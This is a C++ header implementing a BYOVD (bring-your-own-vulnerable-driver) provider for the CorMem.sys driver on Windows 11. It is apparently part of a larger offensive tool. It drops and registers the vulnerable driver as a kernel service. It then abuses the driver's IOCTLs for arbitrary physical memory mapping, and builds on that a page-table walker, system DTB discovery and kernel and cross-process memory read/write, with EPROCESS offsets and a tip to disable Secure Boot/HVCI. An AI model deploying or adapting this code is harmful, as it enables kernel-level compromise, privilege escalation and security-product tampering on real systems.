#pragma once
// ============================================================
// cormem.h — CorMem.sys BYOVD Provider
// Physical memory R/W via MapBuffer IOCTL (maps pages into
// userspace for direct memcpy — much faster than RTCore64's
// 4-byte-at-a-time IOCTL approach).
//
// Based on 4D4J's cormem-read-poc. Added to LOLDrivers 2026-04-06.
// SHA256: 40c855d20d497823716a08a443dc85846233226985ee653770bc3b245cf2ed0f
// ============================================================

#include <Windows.h>
#include <Psapi.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include "driver_provider.h"

#pragma comment(lib, "psapi.lib")

namespace BYOVD
{
    // CorMem IOCTL codes
    constexpr DWORD IOCTL_CORMEM_MAP_POOL             = 0x222000;
    constexpr DWORD IOCTL_CORMEM_MAP_BUFFER           = 0x22200C;
    constexpr DWORD IOCTL_CORMEM_UNMAP_BUFFER         = 0x222010;
    constexpr DWORD IOCTL_CORMEM_LINEAR_TO_PHYS       = 0x22201C;
    constexpr DWORD IOCTL_CORMEM_GET_POOL_BLOCK_COUNT = 0x22205C;

    // CorMem IOCTL structures
    #pragma pack(push, 1)
    struct CM_MAP_BUFFER_IN
    {
        uint64_t Address;   // Physical address
        uint64_t Size;
        uint64_t CacheType; // 1 = MmCached
    };
    static_assert(sizeof(CM_MAP_BUFFER_IN) == 0x18);

    struct CM_UNMAP_BUFFER_IN
    {
        uint64_t MappedAddress;
        uint64_t Size;
    };
    static_assert(sizeof(CM_UNMAP_BUFFER_IN) == 0x10);

    struct CM_MAP_POOL_OUT
    {
        uint64_t UserAddress;
        uint64_t KernelAddress;
        uint64_t PhysicalAddress;
        uint32_t Size;
    };
    static_assert(sizeof(CM_MAP_POOL_OUT) == 0x1C);
    #pragma pack(pop)

    struct PoolBlock
    {
        uint64_t UserAddress;
        uint64_t KernelAddress;
        uint64_t PhysicalAddress;
        uint64_t Size;
    };

    // Page table constants
    constexpr uint64_t PAGE_PRESENT    = 0x1;
    constexpr uint64_t PAGE_LARGE      = 0x80;
    constexpr uint64_t PAGE_4KB        = 0x1000ULL;
    constexpr uint64_t PAGE_2MB        = 0x200000ULL;
    constexpr uint64_t PAGE_1GB        = 0x40000000ULL;
    constexpr uint64_t PFN_MASK        = 0x000FFFFFFFFFF000ULL;

    // Processor startup block signatures for DTB discovery
    constexpr uint64_t PSB_SIG_MASK     = 0xffffffffffff00ffULL;
    constexpr uint64_t PSB_SIG_VALUE    = 0x00000001000600E9ULL;
    constexpr uint64_t KERNEL_VA_MASK   = 0xfffff80000000003ULL;
    constexpr uint64_t KERNEL_VA_EXPECT = 0xfffff80000000000ULL;
    constexpr uint64_t PML4_BAD_BITS    = 0xffffff0000000fffULL;

    // EPROCESS offsets — Windows 11 25H2 (build 26200+)
    namespace EProcOff
    {
        constexpr size_t DTB   = 0x028;
        constexpr size_t PID   = 0x4C0;
        constexpr size_t Links = 0x4C8;
    }

    class CorMemProvider : public IDriverProvider
    {
        static constexpr uint32_t MAX_POOL_BLOCKS = 0x101;
        static constexpr const wchar_t* SVC_NAME  = L"CORMEMcs2";
        static constexpr const wchar_t* DEV_PATH  = L"\\\\.\\CORMEM";
        static constexpr const char*    DISP_NAME = "CorMem";

        HANDLE    m_hDevice       = INVALID_HANDLE_VALUE;
        uint32_t  m_poolBlockCount = 0;
        PoolBlock m_poolBlocks[MAX_POOL_BLOCKS] = {};
        uint64_t  m_systemDTB     = 0;

    public:
        CorMemProvider() = default;
        ~CorMemProvider() override { Close(); }

        // Non-copyable
        CorMemProvider(const CorMemProvider&) = delete;
        CorMemProvider& operator=(const CorMemProvider&) = delete;

        const wchar_t* ServiceName() const override { return SVC_NAME; }
        const char*    DisplayName() const override  { return DISP_NAME; }

        bool Open() override
        {
            m_hDevice = CreateFileW(DEV_PATH, GENERIC_READ | GENERIC_WRITE,
                0, nullptr, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] CorMem device not found, loading driver...\n");
                if (!LoadDriver())
                    return false;

                m_hDevice = CreateFileW(DEV_PATH, GENERIC_READ | GENERIC_WRITE,
                    0, nullptr, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
            }

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] Failed to open CorMem device (0x%lX)\n", GetLastError());
                return false;
            }

            // Map pool blocks (required for address translation helpers)
            uint32_t count = 0;
            if (!GetPoolBlockCount(&count) || count > MAX_POOL_BLOCKS)
            {
                printf("[BYOVD] Failed to get pool block count\n");
                Close();
                return false;
            }
            m_poolBlockCount = count;

            for (uint32_t i = 0; i < m_poolBlockCount; i++)
            {
                if (!MapPoolBlock(i))
                {
                    printf("[BYOVD] Failed to map pool block %u\n", i);
                    Close();
                    return false;
                }
            }

            // Find system DTB for virtual address translation
            if (!FindSystemDTB())
            {
                // Retry after delay - driver may need time after service start
                Sleep(2000);
                if (!FindSystemDTB())
                {
                    printf("[BYOVD] DTB discovery failed - using LinearToPhys fallback\n");
                }
            }

            printf("[BYOVD] CorMem opened — %u pool blocks, DTB=0x%llX\n",
                   m_poolBlockCount, (unsigned long long)m_systemDTB);
            return true;
        }

        void Close() override
        {
            if (m_hDevice != INVALID_HANDLE_VALUE)
            {
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
            }
            m_poolBlockCount = 0;
            m_systemDTB = 0;
            memset(m_poolBlocks, 0, sizeof(m_poolBlocks));
        }

        bool IsOpen() const override { return m_hDevice != INVALID_HANDLE_VALUE; }

        // ---- IDriverProvider: kernel virtual address R/W ----
        // These translate VA → PA via page table walk, then do physical R/W.
        // The kernel context calls ReadBuffer/WriteBuffer with kernel VAs.

        bool ReadBuffer(uintptr_t address, void* buffer, size_t size) override
        {
            auto* dst = static_cast<uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t va = address;

            while (remaining > 0)
            {
                uint64_t pa = 0;
                if (m_systemDTB)
                    pa = TranslateVA(m_systemDTB, va);
                else
                    pa = LinearToPhys(va);  // driver-side VA->PA (no DTB needed)
                if (!pa) return false;

                size_t chunk = min(remaining, (size_t)(PAGE_4KB - (va & 0xFFF)));
                if (!ReadPhysical(pa, dst, chunk)) return false;

                dst += chunk;
                va += chunk;
                remaining -= chunk;
            }
            return true;
        }

        bool WriteBuffer(uintptr_t address, const void* buffer, size_t size) override
        {
            auto* src = static_cast<const uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t va = address;

            while (remaining > 0)
            {
                uint64_t pa = 0;
                if (m_systemDTB)
                    pa = TranslateVA(m_systemDTB, va);
                else
                    pa = LinearToPhys(va);
                if (!pa) return false;

                size_t chunk = min(remaining, (size_t)(PAGE_4KB - (va & 0xFFF)));
                if (!WritePhysical(pa, src, chunk)) return false;

                src += chunk;
                va += chunk;
                remaining -= chunk;
            }
            return true;
        }

        uint64_t SystemDTB() const { return m_systemDTB; }

        // ---- Cross-process R/W (user VA via target process CR3) ----

        bool ReadBufferProcess(uint64_t processCR3, uintptr_t va, void* buffer, size_t size) override
        {
            auto* dst = static_cast<uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t curVA = va;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(processCR3, curVA);
                if (!pa) return false;

                size_t chunk = min(remaining, (size_t)(PAGE_4KB - (curVA & 0xFFF)));
                if (!ReadPhysical(pa, dst, chunk)) return false;

                dst += chunk;
                curVA += chunk;
                remaining -= chunk;
            }
            return true;
        }

        bool WriteBufferProcess(uint64_t processCR3, uintptr_t va, const void* buffer, size_t size) override
        {
            auto* src = static_cast<const uint8_t*>(buffer);
            size_t remaining = size;
            uint64_t curVA = va;

            while (remaining > 0)
            {
                uint64_t pa = TranslateVA(processCR3, curVA);
                if (!pa)
                {
                    printf("[CorMem] WriteBufferProcess: VA 0x%llX → PA translation failed (CR3=0x%llX)\n",
                        (unsigned long long)curVA, (unsigned long long)processCR3);
                    return false;
                }

                size_t chunk = min(remaining, (size_t)(PAGE_4KB - (curVA & 0xFFF)));
                if (!WritePhysical(pa, src, chunk)) return false;

                src += chunk;
                curVA += chunk;
                remaining -= chunk;
            }
            return true;
        }

    private:
        // ---- Low-level IOCTL helpers ----

        bool SendIoctl(DWORD code, void* inBuf, DWORD inSz,
                       void* outBuf, DWORD outSz, DWORD* bytesRet = nullptr)
        {
            DWORD br = 0;
            BOOL ok = DeviceIoControl(m_hDevice, code, inBuf, inSz, outBuf, outSz, &br, nullptr);
            if (bytesRet) *bytesRet = br;
            return ok != FALSE;
        }

        uint64_t MapBuffer(uint64_t physAddr, uint64_t size)
        {
            CM_MAP_BUFFER_IN in = { physAddr, size, 1 }; // 1 = MmCached
            uint64_t out = 0;
            SendIoctl(IOCTL_CORMEM_MAP_BUFFER, &in, sizeof(in), &out, sizeof(out));
            return out;
        }

        // Driver-side VA → PA translation (MmGetPhysicalAddress)
        // Works for kernel VAs without needing DTB
        uint64_t LinearToPhys(uint64_t va)
        {
            uint64_t in = va, out = 0;
            SendIoctl(IOCTL_CORMEM_LINEAR_TO_PHYS, &in, sizeof(in), &out, sizeof(out));
            return out;
        }

        bool UnmapBuffer(uint64_t mapped, uint64_t size)
        {
            CM_UNMAP_BUFFER_IN in = { mapped, size };
            return SendIoctl(IOCTL_CORMEM_UNMAP_BUFFER, &in, sizeof(in), nullptr, 0);
        }

        bool GetPoolBlockCount(uint32_t* count)
        {
            uint32_t out = 0;
            DWORD br = 0;
            if (!SendIoctl(IOCTL_CORMEM_GET_POOL_BLOCK_COUNT, nullptr, 0, &out, sizeof(out), &br) || br == 0)
                return false;
            *count = out;
            return true;
        }

        bool MapPoolBlock(uint32_t index)
        {
            uint32_t input = index;
            CM_MAP_POOL_OUT output = {};
            DWORD br = 0;
            if (!SendIoctl(IOCTL_CORMEM_MAP_POOL, &input, sizeof(input), &output, sizeof(output), &br) || br == 0)
                return false;
            m_poolBlocks[index] = { output.UserAddress, output.KernelAddress,
                                    output.PhysicalAddress, output.Size };
            return true;
        }

        // ---- Physical memory R/W (core primitive) ----
        // Maps physical memory into userspace, memcpy, unmap.

        bool ReadPhysical(uint64_t physAddr, void* buffer, size_t size)
        {
            uint64_t mapped = MapBuffer(physAddr, size);
            if (!mapped) return false;
            memcpy(buffer, reinterpret_cast<void*>(mapped), size);
            UnmapBuffer(mapped, size);
            return true;
        }

        bool WritePhysical(uint64_t physAddr, const void* buffer, size_t size)
        {
            uint64_t mapped = MapBuffer(physAddr, size);
            if (!mapped) return false;
            memcpy(reinterpret_cast<void*>(mapped), buffer, size);
            UnmapBuffer(mapped, size);
            return true;
        }

        // ---- Page table walking ----

        uint64_t TranslateVA(uint64_t dtb, uint64_t va)
        {
            uint64_t pml4Idx = (va >> 39) & 0x1FF;
            uint64_t pdptIdx = (va >> 30) & 0x1FF;
            uint64_t pdIdx   = (va >> 21) & 0x1FF;
            uint64_t ptIdx   = (va >> 12) & 0x1FF;
            uint64_t offset  = va & 0xFFF;

            uint64_t pml4e = 0;
            if (!ReadPhysical((dtb & ~0xFFFULL) + pml4Idx * 8, &pml4e, 8) || !(pml4e & PAGE_PRESENT))
                return 0;

            uint64_t pdpte = 0;
            if (!ReadPhysical((pml4e & PFN_MASK) + pdptIdx * 8, &pdpte, 8) || !(pdpte & PAGE_PRESENT))
                return 0;
            if (pdpte & PAGE_LARGE)
                return (pdpte & 0x000FFFFFC0000000ULL) + (va & (PAGE_1GB - 1));

            uint64_t pde = 0;
            if (!ReadPhysical((pdpte & PFN_MASK) + pdIdx * 8, &pde, 8) || !(pde & PAGE_PRESENT))
                return 0;
            if (pde & PAGE_LARGE)
                return (pde & 0x000FFFFFFFE00000ULL) + (va & (PAGE_2MB - 1));

            uint64_t pte = 0;
            if (!ReadPhysical((pde & PFN_MASK) + ptIdx * 8, &pte, 8) || !(pte & PAGE_PRESENT))
                return 0;

            return (pte & PFN_MASK) + offset;
        }

        // ---- System DTB discovery ----
        // Scans low 1MB of physical memory for processor startup block

        bool FindSystemDTB()
        {
            auto* lowStub = new uint8_t[0x100000];
            if (!lowStub) return false;

            uint32_t readOk = 0, readFail = 0;
            for (uint32_t off = 0; off < 0x100000; off += 0x1000)
            {
                if (ReadPhysical(off, lowStub + off, 0x1000))
                    readOk++;
                else
                {
                    memset(lowStub + off, 0, 0x1000);
                    readFail++;
                }
            }
            printf("[BYOVD] Low stub scan: %u pages OK, %u failed\n", readOk, readFail);

            bool found = false;
            for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000)
            {
                uint64_t sig = *reinterpret_cast<uint64_t*>(lowStub + off);
                if ((sig & PSB_SIG_MASK) != PSB_SIG_VALUE)
                    continue;

                uint64_t kernEntry = *reinterpret_cast<uint64_t*>(lowStub + off + 0x70);
                if ((kernEntry & KERNEL_VA_MASK) != KERNEL_VA_EXPECT)
                    continue;

                uint64_t pml4 = *reinterpret_cast<uint64_t*>(lowStub + off + 0xA0);
                if (pml4 & PML4_BAD_BITS || pml4 == 0 || pml4 > 0x100000000ULL)
                    continue;

                // Validate the PML4 page
                uint64_t pml4Page[512] = {};
                if (ReadPhysical(pml4, pml4Page, sizeof(pml4Page)))
                {
                    uint32_t valid = 0, kernel = 0;
                    for (int i = 0; i < 512; i++)
                    {
                        if (!(pml4Page[i] & PAGE_PRESENT)) continue;
                        uint64_t pfn = pml4Page[i] & PFN_MASK;
                        if (pfn >= 0x8000000000ULL) continue;
                        valid++;
                        if (i >= 256) kernel++;
                    }
                    if (valid > 0 && kernel > 0)
                    {
                        m_systemDTB = pml4;
                        found = true;
                        printf("[BYOVD] DTB: 0x%llX\n", (unsigned long long)pml4);
                        break;
                    }
                }
            }

            delete[] lowStub;
            return found;
        }

        // ---- Driver loading via SCM ----

        bool LoadDriver()
        {
            wchar_t drvPath[MAX_PATH];
            GetTempPathW(MAX_PATH, drvPath);
            wcscat_s(drvPath, L"CORMEM.SYS");

            // Try embedded resource first (ID 103 = CORMEM.SYS)
            bool extracted = false;
            HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(103), MAKEINTRESOURCEW(10));
            if (hRes)
            {
                HGLOBAL hData = LoadResource(nullptr, hRes);
                DWORD sz = SizeofResource(nullptr, hRes);
                auto* ptr = static_cast<const BYTE*>(LockResource(hData));
                if (ptr && sz)
                {
                    HANDLE hf = CreateFileW(drvPath, GENERIC_WRITE, 0, nullptr,
                                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hf != INVALID_HANDLE_VALUE)
                    {
                        DWORD wr = 0;
                        WriteFile(hf, ptr, sz, &wr, nullptr);
                        CloseHandle(hf);
                        extracted = (wr == sz);
                    }
                }
            }

            if (!extracted)
            {
                // Fallback: look for CORMEM.SYS next to the exe
                wchar_t selfDir[MAX_PATH];
                GetModuleFileNameW(nullptr, selfDir, MAX_PATH);
                wchar_t* sl = wcsrchr(selfDir, L'\\');
                if (sl) *(sl + 1) = L'\0';
                wcscat_s(selfDir, L"CORMEM.SYS");

                if (GetFileAttributesW(selfDir) == INVALID_FILE_ATTRIBUTES)
                {
                    printf("[BYOVD] CORMEM.SYS not available (no resource, no file)\n");
                    return false;
                }
                CopyFileW(selfDir, drvPath, FALSE);
            }

            // Register as kernel service
            SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
            if (!scm)
            {
                printf("[BYOVD] OpenSCManager failed (run as Admin)\n");
                return false;
            }

            // Clean up any previous instance
            SC_HANDLE existing = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
            if (existing)
            {
                SERVICE_STATUS ss;
                ControlService(existing, SERVICE_CONTROL_STOP, &ss);
                DeleteService(existing);
                CloseServiceHandle(existing);
                Sleep(1000);
            }

            SC_HANDLE svc = CreateServiceW(
                scm, SVC_NAME, SVC_NAME,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);

            if (!svc)
            {
                DWORD err = GetLastError();
                if (err == ERROR_SERVICE_MARKED_FOR_DELETE)
                {
                    printf("[BYOVD] Service marked for delete — waiting...\n");
                    for (int i = 0; i < 40; ++i)
                    {
                        Sleep(250);
                        svc = CreateServiceW(scm, SVC_NAME, SVC_NAME,
                            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                            drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                        if (svc) break;
                        if (GetLastError() == ERROR_SERVICE_EXISTS)
                        {
                            svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                            break;
                        }
                    }
                }
                else if (err == ERROR_SERVICE_EXISTS)
                {
                    svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                }

                if (!svc)
                {
                    printf("[BYOVD] CreateService failed: 0x%lX\n", GetLastError());
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            if (!StartServiceW(svc, 0, nullptr))
            {
                DWORD err = GetLastError();
                if (err == ERROR_ALREADY_EXISTS)
                {
                    printf("[BYOVD] Stale CorMem device — cleaning up...\n");
                    SERVICE_STATUS ss;
                    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    svc = nullptr;

                    // Wait for device to disappear
                    for (int i = 0; i < 30; ++i)
                    {
                        Sleep(200);
                        HANDLE probe = CreateFileW(DEV_PATH,
                            GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr, OPEN_EXISTING, 0, nullptr);
                        if (probe == INVALID_HANDLE_VALUE) break;
                        CloseHandle(probe);
                    }
                    Sleep(1000);

                    svc = CreateServiceW(scm, SVC_NAME, SVC_NAME,
                        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                        drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS)
                        svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);

                    if (!svc || !StartServiceW(svc, 0, nullptr))
                    {
                        DWORD e = svc ? GetLastError() : 0;
                        if (e != ERROR_SERVICE_ALREADY_RUNNING)
                        {
                            printf("[BYOVD] Retry StartService failed: 0x%lX\n", e);
                            if (svc) { DeleteService(svc); CloseServiceHandle(svc); }
                            CloseServiceHandle(scm);
                            return false;
                        }
                    }
                    printf("[BYOVD] CorMem reloaded after cleanup\n");
                }
                else if (err != ERROR_SERVICE_ALREADY_RUNNING)
                {
                    printf("[BYOVD] StartService failed: 0x%lX\n", err);
                    printf("[BYOVD] Tip: Disable Secure Boot / HVCI if driver is blocked\n");
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            printf("[BYOVD] CORMEM.SYS loaded successfully\n");
            if (svc) CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return true;
        }
    };
}
